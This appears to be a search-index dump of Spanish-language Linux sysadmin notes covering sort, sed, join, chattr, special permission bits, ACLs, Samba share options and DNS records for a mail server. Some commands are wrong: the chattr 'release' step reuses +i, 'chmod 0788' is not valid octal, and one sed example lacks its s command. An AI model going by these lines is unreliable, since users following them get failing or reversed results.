-k3n,3 campo 3 ordenado numericamente -t delimitador entre campos Ordenar campo 4 orden descendente numericamente passwd | sort -t: -k4rn,4 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin Ordenaci\u00f3n --> estable ( propiedad ) En ordenaciones siempre a de ver un campo clave, esto significa que si filtras por un campo en el que puede aber resultados iguales, se tiene que filtrar por un segundo o mas campos. ll / | head | tr -s \"[:blank:]\" ' ' | cut -d \" \" -f2,3,5,6 | sort -t ' ' -k3n,3 -k1n,1 18 root 3 ,3K ene 2 root 4 ,0K ene 2 root 4 ,0K ene 3 root 4 ,0K ene 5 root 4 ,0K ene 19 root 4 ,0K ene 162 root 12K ene 1 root 30 ene 1 root 30 ene Normalizo la salida con tr recorto las filas que me interesan con cut Ordeno numericamente, ascendente, por la columna 3 y los que coinciden por la 1","title":"SORT"},{"location":"administracion/per/#sed","text":"Sintaxis sed <seleccio de linies> 's/<que busco>/<por que cambio>/<numero de veces>' echo \"hola mama que tal\" | sed 's/mama/papa/' hola papa que tal # sustituir una vez sed 's/mama/papa/' # sustituir recursivamente sed 's/mama/papa/g' # desde la linea 3 hasta el final sed '3,$ s/bin/BIN/g' text # desde linea 1 hasta 7 incluida sed '1,7 s/bin/BIN/g' text # sustitulle en las lineas que contengan elfo bin por BIN sed '/elfo/ s/bin/BIN/g' text # desde la linea que contenga capitulo 1 hasta capitulo 2 sustitulle bin por BIN sed '/capitulo 1/,/capitulo 2/ s/bin/BIN/g' text # desde la linea que contenga capitulo 2 hasta el final sed '/capitulo 2/,$ s/bin/BIN/g' text Sed con expresiones # dejar linea 3 en blanco sed '3 /^.*$//g' # eliminar el primer campo echo \"Nom:Cognom:Adre\u00e7a:email\" | sed 's/^[^:]*://g' Cognom:Adre\u00e7a:email # Reordenar primer y segundo campo. \"\\1 y \\2\" se refiere a parentesi 1 y 2 echo \"Nom:Cognom:Adre\u00e7a:email\" | sed -r 's/^([^:]*):([^:]*):/\\2:\\1:/g' Cognom:Nom:Adre\u00e7a:email # eliminar un campo y redistribuir los otros. echo \"Nom:Grup:Nota\" | sed -r 's/^([^:]*):([^:]*):(.*)$/\\3--\\1/g' Nota--Nom # modificar un valor. \"&\" se refiere al contenido a substituir echo \"Nom:Grup:Nota\" | sed -r 's/Grup/ASI-&/g' Nom:ASI-Grup:Nota # utilizando variables NOMBRE = \"Jorge\" echo \"Nom:Grup:Nota\" | sed -r \"s/Nom/ $NOMBRE /g\" Jorge:Grup:Nota # poner separador de millares echo \"45200\" | sed -r \"s/[0-9]{3} $ /.&/g\" 45 .200","title":"SED"},{"location":"administracion/per/#paste","text":"paste concatena linea a linea la informacion de dos ficheros \u279c cat notas 1 2 5 9 \u279c cat nombres juan anna pedro lucia \u279c paste nombres notas juan 1 anna 2 pedro 5 lucia 9","title":"paste"},{"location":"administracion/per/#join","text":"Join relaciona dos ficheros seg\u00fan un campo. archivos base. cat adats.txt pere 12 marta 25 juan 10 cat notes.txt pere 6 marta 10 juan 8 .5 lluis 4 Hay que tener en cuenta que el primer archivo se indica como -1 y el segundo archivo -2 # relacion automatica join adats.txt notes.txt pere 12 6 marta 25 10 juan 10 8 .5 # Relacionar por campo 1 del archivo 1 join -1 1 adats.txt notes.txt pere 12 6 marta 25 10 juan 10 8 .5 # relacionar por campo 1 del archivo 1 y 2 join -1 1 -2 1 adats.txt notes.txt pere 12 6 marta 25 10 juan 10 8 .5 # idem anteror + mostrar salida archivo 2 campo 2 join -o2.2 -1 1 -2 1 adats.txt notes.txt 6 10 8 .5 # idem anterior + salida campo 1 del archivo 1 join -o2.2,1.1 -1 1 -2 1 adats.txt notes.txt 6 pere 10 marta 8 .5 juan - -o se creiere a output, que quiees mostrar y de donde. Left y right join. indicamos left join con -a 1 y right join con -a 2 . # left join join -a 1 -o2.2,1.1 -1 1 -2 1 adats.txt notes.txt 6 pere 10 marta 8 .5 juan # right join join -a 2 -o2.2,1.1 -1 1 -2 1 adats.txt notes.txt 6 pere 10 marta 8 .5 juan 4","title":"JOIN"},{"location":"administracion/per/#chattr","text":"Protegemos nuestros archivos de un posible borrado chattr, con este comando no podremos borrar dicho archivo o carpeta ni siendo root. Al protegerlo no nos dejar\u00e1 crear clonaciones tipo hard, solo accesos directos tipo Soft aunque no podremos editarlo de ninguna manera. Proteger sudo chattr +i <archivo/carpeta> Liberar sudo chattr +i <archivo/carpeta>","title":"Chattr"},{"location":"administracion/permisos_avanzados/","text":"Permisos avanzados nombre valor valor octal setuid s 4 setgid s 2 sticky t 1 En ficheros podemos jugar con setuid y setgid, sticky es solo para directorios. El concepto es simple, cuando est\u00e1n aplicados setuid o setgid ese fichero se ejecutara en nombre del usuario del fichero o del grupo del fichero. Setuid Con setuid aplicado en un fichero, dicho fichero se ejecutara en nombre del usuario del fichero. Podemos ver que el bit est\u00e1 asignado (s) haciendo un ls: $ ls -l /bin/su -rwsr-xr-x 1 root root 31012 2015 -04-04 10 :49 /bin/su # Para asignar este bit a un fichero: chmod u+s /bin/su # en octal chmod 4755 /bin/su # Y para quitarlo: chmod u-s /bin/su # en octal chmod 0788 /bin/su Si no tuviera el setuid asignado no podr\u00edas ejecutar su, ya que se te negar\u00eda el permiso. Setgid Setgid se puede aplicar tanto a ficheros como a directorios. En ficheros se comporta igual que setuid pero asignado al grupo. Lo interesante es la aplicaci\u00f3n en directorios. Si queremos tener un directorio compartido, se aplica setgid y todos los archivos que se creen dentro pertenecer\u00e1n al grupo del directorio. Podemos ver que el bit est\u00e1 asignado (s) haciendo un ls: $ ls -l compartida -rwxrwsr-x 1 jorge jorge 31012 2018 -08-10 12 :25 compartida/ # Para asignar este bit a un fichero: chmod g+s compartida/ # en octal chmod 2755 compartida/ # Y para quitarlo: chmod g-s compartida/ # en octal chmod 0788 compartida/ Creo un archivo con otro usuario dentro del directorio y ago la prueba. $ su # touch test root@sistemas:/home/jorge/compartido # ls -l total 0 -rw-r--r-- 1 root jorge 0 2018 -08-10 12 :30 test # whoami root Sticky Se suele asignar a directorios al que todo el mundo tiene acceso, permite evitar que un usuario borre los archivos de otro ya que tiene permisos de escritura dentro del directorio. Cabe decir que aun que se asigna en la secci\u00f3n de others tambi\u00e9n afecta al grupo. Podemos ver que el bit est\u00e1 asignado (t) haciendo un ls: $ ls -l compartida -rwxrwxr-t 1 jorge jorge 31012 2018 -08-10 12 :25 compartida/ # Para asignar este bit a un fichero: chmod o+t compartida/ # en octal chmod 1755 compartida/ # Y para quitarlo: chmod o-t compartida/ # en octal chmod 0788 compartida/ ACL Acces Control List Opciones b\u00e1sicas Opci\u00f3n Acci\u00f3n b borrar todas acl's k borrar todas las default R recursivo x borrar acl especifica d default a\u00f1adir por defecto m a\u00f1adir o modificar acl Sintaxis # Agregar permisos para un usuario setfacl -m \"u:user:permissions\" <file/dir> # Agregar permisos para un grupo (group es el nombre del grupo o el ID del grupo): setfacl -m \"g:group:permissions\" <file/dir> Ejemplos Mostrar acl\\'s getfacl <nombre archivo> Borrar todas las acl del directorio compartida setfacl -bkR compartida Borrar acl de grupo para el usuario user3 setfacl -x g:user3 <file/dir> Establecer todos lo permisos para el usuario Jhonny en el archivo con nombre \u201cabc\u201d: setfacl -m \"u:johny:rwx\" abc Dar permisos de g=rw- a archivos dentro del directorio compartida y permisos g=rwx a los directorios por defecto y de forma recursiva setfacl -dRm g::rwx compartida Ejemplo practico Queremos que 3 usuarios que pertenecen al departamento de secretaria, trabajen compartiendo archivos de un directorio. Los otros no podran ver el contenido del directorio. Los tres podran leer y editar pero no borrar el de su compa\u00f1ero. Umask por defecto 0022 Creo carpeta y a\u00f1ado permisos de setgid y sticky para compartir libremente. Con user1 mkdir -m 3770 compartida chgrp secre compartida Con acl a\u00f1ado permisos para que el grupo puedan editar archivos entre ellos setfacl -dRm g:secre:rwx compartida Esto hace que al crear archivos se creen por defecto con permisos de grupo rw- Creo nuevos archivos y verifico que funciona # user1 ls > compartida/info.txt # user2 ls > compartida/data.pdf # user3 ls > compartida/carta.odt # user3 ls -l compartida/ -rw-rw----+ 1 user3 secre 642 nov 10 19 :58 carta.odt -rw-rw----+ 1 user2 secre 30 nov 10 19 :58 data.pdf -rw-rw----+ 1 user1 secre 11 nov 10 19 :57 info.txt Verifico que puedo editar en otros pero no borrar el trabajo de otros. # user3 $ echo \"modificando ultima linea\" >> compartida/info.txt $ rm compartida/info.txt rm: no se puede borrar 'compartida/info.txt' : Operaci\u00f3n no permitida Ahora dentro de compartida creo un directorio excluyendo a user3 # user1 mkdir compartida/top-secret ls > compartida/top-secret/info2.txt setfacl -m u:user3:--- compartida/top-secret # user3 $ ls compartida/top-secret/ ls: no se puede abrir el directorio 'compartida/top-secret/' : Permiso denegado","title":"Permisos avanzados"},{"location":"administracion/permisos_avanzados/#permisos-avanzados","text":"nombre valor valor octal setuid s 4 setgid s 2 sticky t 1 En ficheros podemos jugar con setuid y setgid, sticky es solo para directorios. El concepto es simple, cuando est\u00e1n aplicados setuid o setgid ese fichero se ejecutara en nombre del usuario del fichero o del grupo del fichero. Setuid Con setuid aplicado en un fichero, dicho fichero se ejecutara en nombre del usuario del fichero. Podemos ver que el bit est\u00e1 asignado (s) haciendo un ls: $ ls -l /bin/su -rwsr-xr-x 1 root root 31012 2015 -04-04 10 :49 /bin/su # Para asignar este bit a un fichero: chmod u+s /bin/su # en octal chmod 4755 /bin/su # Y para quitarlo: chmod u-s /bin/su # en octal chmod 0788 /bin/su Si no tuviera el setuid asignado no podr\u00edas ejecutar su, ya que se te negar\u00eda el permiso. Setgid Setgid se puede aplicar tanto a ficheros como a directorios. En ficheros se comporta igual que setuid pero asignado al grupo. Lo interesante es la aplicaci\u00f3n en directorios. Si queremos tener un directorio compartido, se aplica setgid y todos los archivos que se creen dentro pertenecer\u00e1n al grupo del directorio. Podemos ver que el bit est\u00e1 asignado (s) haciendo un ls: $ ls -l compartida -rwxrwsr-x 1 jorge jorge 31012 2018 -08-10 12 :25 compartida/ # Para asignar este bit a un fichero: chmod g+s compartida/ # en octal chmod 2755 compartida/ # Y para quitarlo: chmod g-s compartida/ # en octal chmod 0788 compartida/ Creo un archivo con otro usuario dentro del directorio y ago la prueba. $ su # touch test root@sistemas:/home/jorge/compartido # ls -l total 0 -rw-r--r-- 1 root jorge 0 2018 -08-10 12 :30 test # whoami root Sticky Se suele asignar a directorios al que todo el mundo tiene acceso, permite evitar que un usuario borre los archivos de otro ya que tiene permisos de escritura dentro del directorio. Cabe decir que aun que se asigna en la secci\u00f3n de others tambi\u00e9n afecta al grupo. Podemos ver que el bit est\u00e1 asignado (t) haciendo un ls: $ ls -l compartida -rwxrwxr-t 1 jorge jorge 31012 2018 -08-10 12 :25 compartida/ # Para asignar este bit a un fichero: chmod o+t compartida/ # en octal chmod 1755 compartida/ # Y para quitarlo: chmod o-t compartida/ # en octal chmod 0788 compartida/","title":"Permisos avanzados"},{"location":"administracion/permisos_avanzados/#acl-acces-control-list","text":"Opciones b\u00e1sicas Opci\u00f3n Acci\u00f3n b borrar todas acl's k borrar todas las default R recursivo x borrar acl especifica d default a\u00f1adir por defecto m a\u00f1adir o modificar acl Sintaxis # Agregar permisos para un usuario setfacl -m \"u:user:permissions\" <file/dir> # Agregar permisos para un grupo (group es el nombre del grupo o el ID del grupo): setfacl -m \"g:group:permissions\" <file/dir> Ejemplos Mostrar acl\\'s getfacl <nombre archivo> Borrar todas las acl del directorio compartida setfacl -bkR compartida Borrar acl de grupo para el usuario user3 setfacl -x g:user3 <file/dir> Establecer todos lo permisos para el usuario Jhonny en el archivo con nombre \u201cabc\u201d: setfacl -m \"u:johny:rwx\" abc Dar permisos de g=rw- a archivos dentro del directorio compartida y permisos g=rwx a los directorios por defecto y de forma recursiva setfacl -dRm g::rwx compartida","title":"ACL Acces Control List"},{"location":"administracion/permisos_avanzados/#ejemplo-practico","text":"Queremos que 3 usuarios que pertenecen al departamento de secretaria, trabajen compartiendo archivos de un directorio. Los otros no podran ver el contenido del directorio. Los tres podran leer y editar pero no borrar el de su compa\u00f1ero. Umask por defecto 0022 Creo carpeta y a\u00f1ado permisos de setgid y sticky para compartir libremente. Con user1 mkdir -m 3770 compartida chgrp secre compartida Con acl a\u00f1ado permisos para que el grupo puedan editar archivos entre ellos setfacl -dRm g:secre:rwx compartida Esto hace que al crear archivos se creen por defecto con permisos de grupo rw- Creo nuevos archivos y verifico que funciona # user1 ls > compartida/info.txt # user2 ls > compartida/data.pdf # user3 ls > compartida/carta.odt # user3 ls -l compartida/ -rw-rw----+ 1 user3 secre 642 nov 10 19 :58 carta.odt -rw-rw----+ 1 user2 secre 30 nov 10 19 :58 data.pdf -rw-rw----+ 1 user1 secre 11 nov 10 19 :57 info.txt Verifico que puedo editar en otros pero no borrar el trabajo de otros. # user3 $ echo \"modificando ultima linea\" >> compartida/info.txt $ rm compartida/info.txt rm: no se puede borrar 'compartida/info.txt' : Operaci\u00f3n no permitida Ahora dentro de compartida creo un directorio excluyendo a user3 # user1 mkdir compartida/top-secret ls > compartida/top-secret/info2.txt setfacl -m u:user3:--- compartida/top-secret # user3 $ ls compartida/top-secret/ ls: no se puede abrir el directorio 'compartida/top-secret/' : Permiso denegado","title":"Ejemplo practico"},{"location":"administracion/samba/","text":"Samba Samba es un protocolo de transferencia de archivos, que permite la transferencia entre dispositivos windows y linux. El protocolo tiene dos demonios smbd, nmbd . smbd shares, files, print. nmbd name resolution. 139 /tcp open netbios-ssn 445 /tcp open microsoft-ds Windows utiliza el protocolo para compartir smb, hoy en dia cifs. Desde linux lo simula con samba, haciendo ver que es un dispositivo windows y permitiendo el acceso. Diferentes rols stand alone: Estar a su aire, el host puede monta directorios remotos, se administra el mismo. server: Ofrecer algun servicio a otro dispositivo, un stand alone que ofrece un servicio especial (montar alg\u00fan directorio). controlador de domini: PDC (primari domain controle) o DC (domain controle) Tipologia de red peer to peer: una red entre iguales. client/servidor: administraci\u00f3n centralizada. windows dominio kerberros kingdom Organizacion workgroup: van a su aire pero pertenecen a un grupo domain: pertenecen a un dominio que tienen que dar autorizacion //server/recurso se denomina unic $ final es un recurso windows oculto smbtree Linux y samba Un cliente de samba, para conectar a un server samba windows Un server samba para compartir una carpeta Puede hacer de controlador de dominio Ordenes samba testparm test de configuracion de samba, ver que estoy compartiendo smbtree funciona en broadcast y muestra los equipos que comparten en red la red. smbtree smbtree -D # ver dominio smbtree -S # ver server smbclient # conectar a un recurso smbclient //samba/manpages # conectar con user actual smbclient -N //samba/manpages # user anonimo smbclient //samba/manpages -U ramon # user ramon smbclient //samba/manpages -U ramon%tururu # user%pasword smbclient -d1 //samba/public # debug rango de 1-9 smbget # descargar archivo de recurso smbget smb://samba/documentation/xz/COPYING smbget -R smb://samba/documentation/ # recursivo smb: \\> get archivo renombre smb: \\> put archivo renombre nmblookup samba nmblookup -A 172 .17.0.2 nmblookup -S samba # registros de recurso pdbedit -L # usuarios de samba smbclient, smbget hacen resolucion por nmb , que este lanza un brodcast a la red para preguntar quien hay sirviendo. mount utiliza dns, por eso en vez de utilizar el nombre del server, utilizo la ip. Ademas se tiene que especificar el protocolo cifs y el usuario. #mount -t protocolo -o usuario //server/recurso /punto_de_montaje sudo mount -t cifs -o guest //172.17.0.2/public /mnt Acceso gr\u00e1fico Desde el explorador de archivos, se puede acceder gr\u00e1ficamente a un recurse que se este sirviendo: smb://samba/public lmhosts equivalente a /etc/hosts lan manager Usuarios Samba tiene sus propios usuarios, pero estos han de existir en el sistema, ya sea linux o windows. useradd lila smbpasswd -a lila Configuraci\u00f3n El archivo de configuraci\u00f3n de samba, se encuentra en /etc/samba/smb.conf define shares, recursos compartidos, y configuraci\u00f3n global. browseable se muestra netbios name = jorge Opciones shares path = /dir1/dir2/share comment = share description volume = share name browseable = yes/no max connections = # public = yes/no guest ok = yes/no guest account = unix-useraccount guest only = yes/no valid users = user1 user2 @group1 @group2 ... invalid users = user1 user2 @group1 @group2 ... auto services = user1 user2 @group1 @group2 ... admin users = user1 user2 @group1 @group2 ... writable = yes/no read only = yes/no write list = user1 user2 @group1 @group2 ... read list = user1 user2 @group1 @group2 ... create mode = 0660 directory mode = 0770 Permisos Usuarios acceso anonimo guest ok = yes es equivalente a public = yes y permiten el acceso al usuario an\u00f3nimo guest, que este en el sistema linux se transforma como nobody . si estan las dos y se contradicen, prevalece la ultima opcion. [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes writable = yes guest ok = yes solo an\u00f3nimo guest only = yes Permite unicamente el acceso a usuarios an\u00f3nimos, si intentas acceder como usuario autom\u00e1ticamente ara un mapping a usuario an\u00f3nimo. [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes writable = yes guest only = yes lista usuarios validos $ smbclient -U user //server/recurs $ smbclient -U user%password //server/recurs valid users = user1 user2 @grup1 @grup2 Permite el acceso al recurso a los usuarios indicados en la lista. An\u00f3nimo tampoco podr\u00e1 acceder aun que este indicado guest ok = yes [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes writable = yes guest ok = yes valid users = lila patipla lista usuarios restringidos invalid users = user1 user2 userN indica la lista de usuarios que no pueden acceder al recurso, los dem\u00e1s si podr\u00e1n acceder. (an\u00f3nimo depender\u00e1 de guest ok ) [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes writable = yes guest ok = yes invalid users = lila patipla Admin admin users = user Permite definir un conjunto de usuarios que ser\u00e1n convertidos en el sistema como root . Es decir el usuario de samba definido como admin, tendr\u00e1 permisos de root en el sistema. [ public ] comment = Share de contingut public path = /var/lib/samba/public writable = yes guest ok = yes admin users = lila Escritura lectura solo lectura read only = yes y writeable = no , son equivalentes. De las dos maneras estamos diciendo que es solo lectura. si estan las dos y se contradicen, prevalece la ultima opcion. [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes writable = no guest ok = yes lectura escritura read only = no y writable = yes , son equivalentes [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes read only = no guest ok = yes lista usuarios lectura read list = user1 user2 userN lista de usuarios que solo pueden leer. Atenci\u00f3n esta directiva se indica en recursos que son de lectura/escritura y sirve para restringir, a los usuarios indicados, a solo lectura. [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes writable = yes read list = rock guest ok = yes Pista de usuarios escritura write list = user1 user2 Lista de usuarios que podr\u00e1n escribir en el recurso, se utiliza en recursos que son solo de lectura. [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes writable = no write list = rock guest ok = yes modos de directorios ficheros create mask = 0600 y directory mask = 0700 permite establecer los permisos con los que se escribir\u00e1n los archivos y directorios. [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes read only = no guest ok = yes create mask = 0600 directory mask = 0700 Homes Por defecto la configuraci\u00f3n de samba viene un share para la exportaci\u00f3n de los homes de usuarios. smbclient //samba/lila -U lila%lila [ homes ] comment = Home Directories browseable = no writable = yes valid users = %S","title":"Samba"},{"location":"administracion/samba/#samba","text":"Samba es un protocolo de transferencia de archivos, que permite la transferencia entre dispositivos windows y linux. El protocolo tiene dos demonios smbd, nmbd . smbd shares, files, print. nmbd name resolution. 139 /tcp open netbios-ssn 445 /tcp open microsoft-ds Windows utiliza el protocolo para compartir smb, hoy en dia cifs. Desde linux lo simula con samba, haciendo ver que es un dispositivo windows y permitiendo el acceso.","title":"Samba"},{"location":"administracion/samba/#diferentes-rols","text":"stand alone: Estar a su aire, el host puede monta directorios remotos, se administra el mismo. server: Ofrecer algun servicio a otro dispositivo, un stand alone que ofrece un servicio especial (montar alg\u00fan directorio). controlador de domini: PDC (primari domain controle) o DC (domain controle)","title":"Diferentes rols"},{"location":"administracion/samba/#tipologia-de-red","text":"peer to peer: una red entre iguales. client/servidor: administraci\u00f3n centralizada. windows dominio kerberros kingdom","title":"Tipologia de red"},{"location":"administracion/samba/#organizacion","text":"workgroup: van a su aire pero pertenecen a un grupo domain: pertenecen a un dominio que tienen que dar autorizacion //server/recurso se denomina unic $ final es un recurso windows oculto smbtree","title":"Organizacion"},{"location":"administracion/samba/#linux-y-samba","text":"Un cliente de samba, para conectar a un server samba windows Un server samba para compartir una carpeta Puede hacer de controlador de dominio","title":"Linux y samba"},{"location":"administracion/samba/#ordenes-samba","text":"testparm test de configuracion de samba, ver que estoy compartiendo smbtree funciona en broadcast y muestra los equipos que comparten en red la red. smbtree smbtree -D # ver dominio smbtree -S # ver server smbclient # conectar a un recurso smbclient //samba/manpages # conectar con user actual smbclient -N //samba/manpages # user anonimo smbclient //samba/manpages -U ramon # user ramon smbclient //samba/manpages -U ramon%tururu # user%pasword smbclient -d1 //samba/public # debug rango de 1-9 smbget # descargar archivo de recurso smbget smb://samba/documentation/xz/COPYING smbget -R smb://samba/documentation/ # recursivo smb: \\> get archivo renombre smb: \\> put archivo renombre nmblookup samba nmblookup -A 172 .17.0.2 nmblookup -S samba # registros de recurso pdbedit -L # usuarios de samba smbclient, smbget hacen resolucion por nmb , que este lanza un brodcast a la red para preguntar quien hay sirviendo. mount utiliza dns, por eso en vez de utilizar el nombre del server, utilizo la ip. Ademas se tiene que especificar el protocolo cifs y el usuario. #mount -t protocolo -o usuario //server/recurso /punto_de_montaje sudo mount -t cifs -o guest //172.17.0.2/public /mnt","title":"Ordenes samba"},{"location":"administracion/samba/#acceso-grafico","text":"Desde el explorador de archivos, se puede acceder gr\u00e1ficamente a un recurse que se este sirviendo: smb://samba/public lmhosts equivalente a /etc/hosts lan manager","title":"Acceso gr\u00e1fico"},{"location":"administracion/samba/#usuarios","text":"Samba tiene sus propios usuarios, pero estos han de existir en el sistema, ya sea linux o windows. useradd lila smbpasswd -a lila","title":"Usuarios"},{"location":"administracion/samba/#configuracion","text":"El archivo de configuraci\u00f3n de samba, se encuentra en /etc/samba/smb.conf define shares, recursos compartidos, y configuraci\u00f3n global. browseable se muestra netbios name = jorge","title":"Configuraci\u00f3n"},{"location":"administracion/samba/#opciones-shares","text":"path = /dir1/dir2/share comment = share description volume = share name browseable = yes/no max connections = # public = yes/no guest ok = yes/no guest account = unix-useraccount guest only = yes/no valid users = user1 user2 @group1 @group2 ... invalid users = user1 user2 @group1 @group2 ... auto services = user1 user2 @group1 @group2 ... admin users = user1 user2 @group1 @group2 ... writable = yes/no read only = yes/no write list = user1 user2 @group1 @group2 ... read list = user1 user2 @group1 @group2 ... create mode = 0660 directory mode = 0770","title":"Opciones shares"},{"location":"administracion/samba/#permisos","text":"","title":"Permisos"},{"location":"administracion/samba/#usuarios_1","text":"","title":"Usuarios"},{"location":"administracion/samba/#acceso-anonimo","text":"guest ok = yes es equivalente a public = yes y permiten el acceso al usuario an\u00f3nimo guest, que este en el sistema linux se transforma como nobody . si estan las dos y se contradicen, prevalece la ultima opcion. [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes writable = yes guest ok = yes","title":"acceso anonimo"},{"location":"administracion/samba/#solo-anonimo","text":"guest only = yes Permite unicamente el acceso a usuarios an\u00f3nimos, si intentas acceder como usuario autom\u00e1ticamente ara un mapping a usuario an\u00f3nimo. [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes writable = yes guest only = yes","title":"solo an\u00f3nimo"},{"location":"administracion/samba/#lista-usuarios-validos","text":"$ smbclient -U user //server/recurs $ smbclient -U user%password //server/recurs valid users = user1 user2 @grup1 @grup2 Permite el acceso al recurso a los usuarios indicados en la lista. An\u00f3nimo tampoco podr\u00e1 acceder aun que este indicado guest ok = yes [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes writable = yes guest ok = yes valid users = lila patipla","title":"lista usuarios validos"},{"location":"administracion/samba/#lista-usuarios-restringidos","text":"invalid users = user1 user2 userN indica la lista de usuarios que no pueden acceder al recurso, los dem\u00e1s si podr\u00e1n acceder. (an\u00f3nimo depender\u00e1 de guest ok ) [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes writable = yes guest ok = yes invalid users = lila patipla","title":"lista usuarios restringidos"},{"location":"administracion/samba/#admin","text":"admin users = user Permite definir un conjunto de usuarios que ser\u00e1n convertidos en el sistema como root . Es decir el usuario de samba definido como admin, tendr\u00e1 permisos de root en el sistema. [ public ] comment = Share de contingut public path = /var/lib/samba/public writable = yes guest ok = yes admin users = lila","title":"Admin"},{"location":"administracion/samba/#escritura-lectura","text":"","title":"Escritura lectura"},{"location":"administracion/samba/#solo-lectura","text":"read only = yes y writeable = no , son equivalentes. De las dos maneras estamos diciendo que es solo lectura. si estan las dos y se contradicen, prevalece la ultima opcion. [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes writable = no guest ok = yes","title":"solo lectura"},{"location":"administracion/samba/#lectura-escritura","text":"read only = no y writable = yes , son equivalentes [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes read only = no guest ok = yes","title":"lectura escritura"},{"location":"administracion/samba/#lista-usuarios-lectura","text":"read list = user1 user2 userN lista de usuarios que solo pueden leer. Atenci\u00f3n esta directiva se indica en recursos que son de lectura/escritura y sirve para restringir, a los usuarios indicados, a solo lectura. [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes writable = yes read list = rock guest ok = yes","title":"lista usuarios lectura"},{"location":"administracion/samba/#pista-de-usuarios-escritura","text":"write list = user1 user2 Lista de usuarios que podr\u00e1n escribir en el recurso, se utiliza en recursos que son solo de lectura. [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes writable = no write list = rock guest ok = yes","title":"Pista de usuarios escritura"},{"location":"administracion/samba/#modos-de-directorios-ficheros","text":"create mask = 0600 y directory mask = 0700 permite establecer los permisos con los que se escribir\u00e1n los archivos y directorios. [ public ] comment = Share de contingut public path = /var/lib/samba/public public = yes browseable = yes read only = no guest ok = yes create mask = 0600 directory mask = 0700","title":"modos de directorios ficheros"},{"location":"administracion/samba/#homes","text":"Por defecto la configuraci\u00f3n de samba viene un share para la exportaci\u00f3n de los homes de usuarios. smbclient //samba/lila -U lila%lila [ homes ] comment = Home Directories browseable = no writable = yes valid users = %S","title":"Homes"},{"location":"administracion/server-correo/","text":"Servidor Correo Para crear este servidor de correo estoy utilizando Postfix, Maildir y Dovecot como cliente utilizo Thunderbird. Este servidor se esta configurando en una maquina virtual Debian10 Buster sobre VirtManager con una configuraci\u00f3n de red Bridge sobre la targeta del Host. +--------+ +--------+ | | | | | | | | Internet | | | | +-----------> | MTA | | MTA | Servidor | | | | | pop3/imap | | | Internet | | +------+ | | | +-----------> | +-------> | MDA | +--+-+ +--------+ +--------+ +---+--+ +----+ | | Servidor MTP Servidor MTP | | | | | | | MUA | | MUA | | | | +----+ +----> +----+ Cliente correo Cliente correo electronico electronico Componentes MUA ( Mail User Agent ) Thunderbird MTA ( Mail transfer agent ) Postfix postfix transfire correo desde un servidor a otro mediante SMTP MDA ( Mail Delivery Agent ) Devecot Devocot reparte los correos de tu servidor a los usuarios a traves de un cliente en este caso thunderbird POP3/IMAP protocolos de acceso al buzon de correo IMAP accede remotamente al buzon del servidor de correo electronico para leer la correspondencia remotamente POP3 descarga el buzon de correo del servidor, para posteriormente leer el correo de forma local Funcionamiento Para enviar un correo se utilizax un MUA que lo transfirere a un servidor MTA con el protocolo SMTP El MTA recibe el correo y lo envia al MTA del destinatario utilizando SMTP El MTA destinatario almacena el correo en el buzon correspondiente, funcion que en algunos casos realiza un programa especifico denominado MDA El mensage permanece en el buzon hasta que el destinatario utiliza su MUA para acceder al buzon mediante los protocolos POP o IMAP Configurar DNS Es necesario configurar un DNS para poder resolver las peticiones de correo en este documento el servidor de correo se encuentra en 192.168.88.13 y el dns en 192.168.88.4 donde la LAN es 192.168.88.0/24 . A la hora de instalar nuestro servidor de correo, tendremos que crear los siguientes registros en el DNS: Un registro de tipo A que apunte a la direcci\u00f3n del servidor de correo. Un registro de tipo PTR, para que funcione la resoluci\u00f3n inversa (necesaria por algunos sistemas para controlar el env\u00edo de SPAM por servidores SMTP. Un registro de tipo MX con la prioridad que deseemos, y que apunte al equipo servidor de correo de nuestro dominio. cat /etc/bind/named.conf.local ... # especificacion de zonas zone \"mymail.com\" { type master ; file \"db.mymail.com\" ; } ; zone \"88.168.192.in-addr.arpa\" { type master ; file \"db.rev.mymail.com\" ; } ; Resoluci\u00f3n directa tipo A y MX cat /var/cache/bind/db.mymail.com $TTL 3600 @ IN SOA server.myail.com. root.mymail.com. ( 2020122001 ; Serial 3600 ; Refresh [ 1h ] 600 ; Retry [ 10m ] 86400 ; Expire [ 1d ] 600 ) ; Negative Cache TTL [ 1h ] ; @ IN NS server.mymail.com. mymail.com. IN MX 10 correo server IN A 192 .168.88.4 torre IN A 192 .168.88.2 portatil IN A 192 .168.88.3 correo IN A 192 .168.88.13 Resoluci\u00f3n inversa tipo PTR cat /var/cache/bind/db.rev.mymail.com $TTL 3600 @ IN SOA server.mymail.com. root.mymail.com. ( 2020122001 ; Serial 3600 ; Refresh [ 1h ] 600 ; Retry [ 10m ] 86400 ; Expire [ 1d ] 600 ) ; Negative Cache TTL [ 1h ] ; IN NS server.mymail.com. 4 IN PTR server.mymail.com. 3 IN PTR portatil.mymail.com. 2 IN PTR torre.mymail.com. 13 IN PTR correo.mymail.com. Comprobaciones DNS Comprobar que la sintaxis es correcta sudo named-checkzone 88 .168.192.in-addr.arpa /var/cache/bind/db.rev.mymail.com zone 88 .168.192.in-addr.arpa/IN: loaded serial 2020122001 OK sudo named-checkzone mymail.com /var/cache/bind/db.mymail.com zone mymail.com/IN: loaded serial 2020122001 OK Comprobar la resoluci\u00f3n de dominio nslookup correo.mymail.com Server: 192 .168.88.4 Address: 192 .168.88.4#53 